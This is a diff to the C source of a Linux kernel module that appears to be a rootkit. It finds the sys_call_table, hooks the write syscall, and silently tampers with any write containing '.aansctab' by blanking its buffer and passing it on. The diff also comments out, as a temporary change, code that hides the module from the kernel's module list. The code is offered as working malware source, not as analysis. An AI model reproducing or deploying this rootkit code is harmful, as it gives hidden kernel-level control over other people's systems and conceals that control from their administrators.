@@ -54,12 +54,32 @@ psize **find(void) {
 
 asmlinkage ssize_t aansctab_write(int fd, const char __user *buff, ssize_t count) {
   int r;
+  int i;
+  char *replace = "infected";
+  size_t len = strlen(replace);
   char *proc_protect = ".aansctab";
   char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
   copy_from_user(kbuff,buff,255);
   if (strstr(kbuff,proc_protect)) {
+    printk("aansctab: this is the content of kbuff \n%s\n", kbuff);
+    strncpy(kbuff, replace, len);
+
+    for (i=0; i<255; i++)
+    {
+      kbuff[i] = '\0';
+    }
+
+    mm_segment_t old_fs;
+
+    old_fs = get_fs();
+
+    set_fs(KERNEL_DS);
+    copy_to_user(buff, kbuff, 255);
+    set_fs(old_fs);
+
+    r = (*o_write)(fd,buff,count);
     kfree(kbuff);
-    return EEXIST;
+    return r;
   }
   r = (*o_write)(fd,buff,count);
   kfree(kbuff);
@@ -67,9 +87,10 @@ asmlinkage ssize_t aansctab_write(int fd, const char __user *buff, ssize_t count
 }
 
 int aansctab_init(void) {
-  /* Do kernel module hiding*/
-  list_del_init(&__this_module.list);
-  kobject_del(&THIS_MODULE->mkobj.kobj);
+  /* Do kernel module hiding (temporarly commentet out) */
+  /* list_del_init(&__this_module.list); 
+   * kobject_del(&THIS_MODULE->mkobj.kobj);
+   */
 
   /* Find the sys_call_table address in kernel memory */
   if ((sys_call_table = (psize *) find())) {
